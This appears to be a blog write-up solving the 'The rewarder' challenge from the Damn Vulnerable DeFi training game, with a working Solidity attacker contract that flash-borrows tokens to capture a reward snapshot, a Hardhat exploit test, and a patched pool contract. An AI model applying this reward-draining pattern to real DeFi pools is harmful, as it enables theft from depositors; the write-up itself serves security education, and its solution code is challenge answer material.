---
layout: post
title: Damn Vulnerable DeFi - The rewarder
---

## Description
There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

## Solution
This is the most complicated contract we've seen so far. We have to analyze several contracts here.
The `FlashLoanderPool` looks bug free so let's turn our attention to `TheRewarderPool`. The `deposit`
function will mint the amount deposited and then distribute rewards to depositors.

This opens it up to a potential predatory deposit. As soon as there's a new rewards round we can
deposit a very large amount and earn rewards on our deposit. Then we can return the flashloan and
keep the rewards. The steps are

1. Take out a flash loan
2. Deposit the flash loan amount in the rewarder pool. This will trigger the rewards distribution.
3. Withdraw the deposit
4. Return the flashloan
5. Send the rewards to the attacker

```
contract RewarderAttacker {
    FlashLoanerPool private flashLoanerPool;
    TheRewarderPool private theRewarderPool;
    RewardToken private rewardToken;
    DamnValuableToken private dvt;
    address private attacker;

    function attack(
        address _flashLoanerPool,
        address _theRewarderPool,
        address _rewardToken,
        address _dvt,
        uint256 amount
    ) external {
        attacker = msg.sender;
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        dvt = DamnValuableToken(_dvt);

        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        dvt.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
```

Rewards are distributed periodically which means we have to "wait" to perform out attack.
We can simulate the wait using hardhat's `evm_increateTime` RPC endpoint.

```
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);

    const RewarderAttackerFactory = await ethers.getContractFactory('RewarderAttacker', deployer); 
    const rewarderAttacker = await RewarderAttackerFactory.deploy();

    await rewarderAttacker.connect(attacker).attack(
        this.flashLoanPool.address,
        this.rewarderPool.address,
        this.rewardToken.address,
        this.liquidityToken.address,
        TOKENS_IN_LENDER_POOL
    );
});
```

## Patched Contract
If we distribute rewards before the mint on deposit, then the flash loan capital won't contribute
to the latest snapshot. This is how we'll mitigate the attack.

```
contract TheRewarderPoolV2 {

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    uint256 public lastSnapshotIdForRewards;
    uint256 public lastRecordedSnapshotTimestamp;

    mapping(address => uint256) public lastRewardTimestamps;

    // Token deposited into the pool by users
    DamnValuableToken public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public accToken;
    
    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    // Track number of rounds
    uint256 public roundNumber;

    constructor(address tokenAddress) {
        // Assuming all three tokens have 18 decimals
        liquidityToken = DamnValuableToken(tokenAddress);
        accToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance
     */
    function deposit(uint256 amountToDeposit) external {
        require(amountToDeposit > 0, "Must deposit tokens");
        
        // Distribute rewards before minting
        distributeRewards();
        accToken.mint(msg.sender, amountToDeposit);

        require(
            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)
        );
    }

    function withdraw(uint256 amountToWithdraw) external {
        accToken.burn(msg.sender, amountToWithdraw);
        require(liquidityToken.transfer(msg.sender, amountToWithdraw));
    }

    function distributeRewards() public returns (uint256) {
        uint256 rewards = 0;

        if(isNewRewardsRound()) {
            _recordSnapshot();
        }        
        
        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;

            if(rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = block.timestamp;
            }
        }

        return rewards;     
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = accToken.snapshot();
        lastRecordedSnapshotTimestamp = block.timestamp;
        roundNumber++;
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp &&
            lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
```